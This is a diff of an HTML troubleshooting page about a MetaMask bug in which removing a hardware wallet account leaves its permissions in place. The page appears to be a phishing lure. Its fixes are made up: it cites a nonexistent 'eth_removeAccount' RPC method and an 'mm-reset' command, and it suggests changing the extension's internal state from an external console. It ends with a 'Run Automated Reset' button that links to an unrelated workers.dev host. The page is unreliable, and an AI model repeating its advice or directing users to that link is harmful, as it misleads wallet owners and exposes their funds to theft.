@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Permissions Removing Hardware Wallet Acc – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #0f111a;
+        font-family: BlinkMacSystemFont;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #00adb5; }
     .btn {
-        background: #ff7b2c;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,34 +42,34 @@
 <h1>Metamask Extension Bug Permissions Removing Hardware Wallet Acc</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience an issue where removing a hardware wallet account from Metamask does not clear the associated permissions, resulting in persistent access and potential security risks.</li>
+<li>Users experience issues with the Metamask extension where removing a hardware wallet account does not clear the associated permissions, resulting in persistent access and potential security risks.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask extension, where the removal of a hardware wallet account does not properly revoke the previously granted permissions, leaving them intact and potentially vulnerable to unauthorized access.</li>
+<li>The error occurs due to a bug in the Metamask extension's permission management system, which fails to properly revoke access when a hardware wallet account is removed.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Attempt to manually revoke permissions by accessing the account settings and explicitly removing the hardware wallet account.</li>
-<li>Utilize the Metamask API to programmatically remove the account and associated permissions.</li>
-<li>Use the following JSON configuration to reset the permissions:</li>
+<li>Attempt to manually revoke permissions using the <code>eth_accounts</code> and <code>eth_requestAccounts</code> methods.</li>
+<li>Utilize the Metamask API to directly remove account permissions with the following JSON payload:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;accounts&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...hardware-wallet-address...&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;permissions&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">  </span><span class="p">]</span>
+<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_removeAccount&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;account_address&quot;</span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
 <span class="p">}</span>
 </code></pre></div>
 
+<ul>
+<li>Use the <code>mm-reset</code> command to reset Metamask to its default state.</li>
+</ul>
 <p>Prerequisites:
 * Metamask extension installed and configured
-* Hardware wallet account connected to Metamask
-* Basic understanding of JSON configuration files
-For further troubleshooting, consider using an external console to execute commands and verify the results.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-activity-contract-deployments-are-displa.html">Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</a></li><li><a href="./archive/2026/06/metamask-extension-bug-multiple-wallets-syncdiscovery-for-socia.html">Metamask Extension Bug Multiple Wallets Syncdiscovery For Social Import Onboarding</a></li></ul>
+* Hardware wallet connected and accounts added
+* Basic understanding of JSON-RPC methods</p>
+<p>For further debugging, consider using an external console to inspect and modify the Metamask extension's internal state.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-notifications-notification-badge-red-num.html">Metamask Extension Bug Notifications Notification Badge Red Num</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-contract-deployments-are-displa.html">Metamask Extension Bug Activity Contract Deployments Are Displayed As Contract Interaction</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
